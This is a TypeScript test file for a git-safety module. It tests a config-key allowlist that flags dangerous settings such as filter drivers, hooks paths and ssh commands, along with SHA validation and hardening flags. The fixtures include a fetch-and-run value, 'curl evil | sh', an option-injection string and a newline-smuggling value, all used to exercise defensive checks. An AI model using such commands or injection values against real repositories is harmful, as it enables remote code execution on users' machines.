import { describe, expect, test } from 'vitest'
import { assertSha, findUntrustedGitConfig, GIT_HARDENING_ARGS } from '../gitSafety'

/** `git config --null --list` framing: `key\nvalue\0` per entry (`key\0` when valueless). */
const nul = (entries: [string, string?][]): string =>
  entries.map(([k, v]) => (v === undefined ? `${k}\0` : `${k}\n${v}\0`)).join('')

describe('findUntrustedGitConfig (allowlist)', () => {
  test('a stock `git init` / clone / user config is trusted', () => {
    const out = nul([
      ['core.repositoryformatversion', '0'],
      ['core.filemode', 'true'],
      ['core.bare', 'false'],
      ['core.logallrefupdates', 'true'],
      ['core.ignorecase', 'true'],
      ['core.precomposeunicode', 'true'],
      ['core.symlinks', 'false'],
      ['user.name', 'A Co-author'],
      ['user.email', 'a@b.c'],
      ['remote.origin.url', 'git@github.com:x/y.git'],
      ['remote.origin.fetch', '+refs/heads/*:refs/remotes/origin/*'],
      ['branch.main.remote', 'origin'],
      ['branch.main.merge', 'refs/heads/main'],
      ['init.defaultbranch', 'main'],
      ['pull.rebase', 'false'],
    ])
    expect(findUntrustedGitConfig(out)).toEqual([])
  })

  test.each([
    ['a filter driver', 'filter.evil.clean'],
    ['a textconv', 'diff.tex.textconv'],
    ['an external diff', 'diff.external'],
    ['a merge driver', 'merge.evil.driver'],
    ['an fsmonitor hook', 'core.fsmonitor'],
    ['a hooks path', 'core.hookspath'],
    ['an ssh command', 'core.sshcommand'],
    ['a gpg program', 'gpg.program'],
    ['an ssh signing key command', 'gpg.ssh.defaultkeycommand'],
    ['commit signing', 'commit.gpgsign'],
    ['a moved work tree', 'core.worktree'],
    ['an include', 'include.path'],
    ['a conditional include', 'includeif.onbranch:stanza/**.path'],
    ['per-worktree config', 'extensions.worktreeconfig'],
    ['submodule recursion', 'submodule.recurse'],
    ['a remote upload-pack command', 'remote.origin.uploadpack'],
    ['an alias', 'alias.st'],
    ['an unknown key', 'something.new'],
  ])('flags %s', (_label, key) => {
    expect(findUntrustedGitConfig(nul([[key, 'x']])).map((r) => r.key)).toEqual([key])
  })

  test('section and variable names match case-insensitively', () => {
    expect(findUntrustedGitConfig(nul([['Core.FileMode', 'true'], ['Remote.Origin.URL', 'u']]))).toEqual([])
    expect(findUntrustedGitConfig(nul([['Core.hooksPath', 'x']])).map((r) => r.key)).toEqual(['Core.hooksPath'])
  })

  test('a subsection cannot borrow an allowed section: only the section name counts', () => {
    // [filter "remote.origin"] url = … is still a filter section.
    expect(findUntrustedGitConfig(nul([['filter.remote.origin.url', 'x']])).map((r) => r.key)).toEqual([
      'filter.remote.origin.url',
    ])
  })

  test('carries the value so the warning can show what would run', () => {
    expect(findUntrustedGitConfig(nul([['filter.x.clean', 'curl evil | sh']]))).toEqual([
      { key: 'filter.x.clean', value: 'curl evil | sh' },
    ])
  })

  test('a value containing newlines cannot smuggle a fake key past the parser', () => {
    expect(findUntrustedGitConfig(nul([['user.name', 'x\nfilter.fake.clean=y']]))).toEqual([])
  })

  test('empty output yields no risks', () => {
    expect(findUntrustedGitConfig('')).toEqual([])
  })
})

describe('assertSha', () => {
  test('accepts abbreviated and full lowercase hex shas', () => {
    expect(assertSha('abc1234')).toBe('abc1234')
    expect(assertSha('4b825dc642cb6eb9a060e54bf8d69288fbee4904')).toBe('4b825dc642cb6eb9a060e54bf8d69288fbee4904')
  })

  test.each([
    ['option injection', '--output=/tmp/pwn'],
    ['a ref name', 'HEAD'],
    ['revision syntax', 'abc1234^'],
    ['too short', 'abc12'],
    ['too long', 'a'.repeat(41)],
    ['uppercase', 'ABC1234'],
    ['empty', ''],
    ['whitespace', 'abc1234 '],
  ])('rejects %s', (_label, sha) => {
    expect(() => assertSha(sha)).toThrow('INVALID_SHA')
  })

  test('rejects non-strings from the renderer', () => {
    expect(() => assertSha(42 as unknown as string)).toThrow('INVALID_SHA')
    expect(() => assertSha(undefined as unknown as string)).toThrow('INVALID_SHA')
  })
})

describe('GIT_HARDENING_ARGS', () => {
  test('disables fsmonitor, hooks, signing and submodule recursion for every invocation', () => {
    expect(GIT_HARDENING_ARGS).toEqual([
      '-c', 'core.fsmonitor=false',
      '-c', 'core.hooksPath=/dev/null',
      '-c', 'commit.gpgSign=false',
      '-c', 'tag.gpgSign=false',
      '-c', 'submodule.recurse=false',
    ])
  })
})
